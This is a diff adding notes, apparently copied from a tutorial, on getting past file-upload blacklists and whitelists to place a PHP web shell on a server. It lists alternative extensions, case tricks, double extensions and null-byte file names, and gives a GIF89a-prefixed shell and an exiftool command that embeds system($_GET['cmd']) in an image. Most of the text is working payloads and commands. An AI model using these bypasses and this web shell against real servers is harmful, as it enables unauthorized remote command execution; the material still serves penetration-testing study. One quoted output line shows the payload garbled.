@@ -1,0 +1,46 @@
+Bypassing Blacklists
+The first method we'll explore is how to bypass blacklisting. Blacklisting is a type of protection where certain strings of data, in this case, specific extensions, are explicitly prohibited from being sent to the server. At first glance, it might seem like an optimal solution to prevent bad extensions, often executables, from being uploaded, but it is trivial to bypass.
+
+Don't Miss: How to Compromise a Web Server & Upload Files to Check for Privilege Escalation
+In addition to the regular extensions, there are alternative extensions that can be used to get around blacklist filters. Here are some extensions for PHP files:
+
+.pht, .phtml, .php3, .php4, .php5, .php6, .inc
+Another popular extension for web shells is JSP, and here are some alternatives:
+
+.jspx, .jspf, .jsw, .jsv
+In some situations, simply changing the case of the extension can trick filters into accepting the file, like so:
+
+.pHp, .Php, .phP
+
+Bypassing Whitelists
+Another type of prevention commonly encountered on the web is whitelisting. Whitelisting is precisely the opposite of blacklisting, where the server accepts only specific extensions. For example, an application that allows you to upload a profile picture might only take JPG, JPEG, or PNG files. While this type of prevention is better than blacklisting, it can still be easily bypassed.
+
+Some web servers, such as Apache, allow files with double extensions. That means we can trick the server into accepting a PHP file that also has a JPG extension tacked on the end:
+
+shell.php.jpg
+We can also use a null byte injection to bypass whitelist filters. Anything after the null character will be ignored when the file is saved, so injecting between a forbidden extension and an allowed extension can lead to a bypass:
+
+shell.php%00.jpg
+Or:
+
+shell.php\x00.jpg
+This can also be accomplished with Burp and modifying the hex request. Name the file shell.phpD.jpg — we'll replace the D character with a null character during the request. When uploading the file, intercept the request, go to the hex tab, and find the hex representation of the D character:
+
+Another way to beat whitelisting is to fool the server with file type headers. Usually, if an upload function accepts images, it will accept GIF files as well. We can add GIF89a; to the beginning of the shell to trick the upload:
+
+GIF89a; <?php system($_GET['cmd']); ?>
+
+Exif Data
+
+use exiftool
+
+exiftool -Comment="<?php system($_GET['cmd']); ?>" pic.jpg
+Now if we use the file command on our pic, we can see the code was successfully inserted:
+
+~# file pic.jpg
+
+pic.jpg: JPEG image data, JFIF standard 1.01, aspect ratio, density 1x1, segment length 16, comment: "<?php system(['cmd']); ?>", baseline, precision 8, 1920x840, components 3
+All we have to do now is add a PHP extension so it can be executed:
+
+~# mv pic.jpg pic.php.jpg
+This technique can be combined with any of the approaches to bypass blacklists or whitelists.
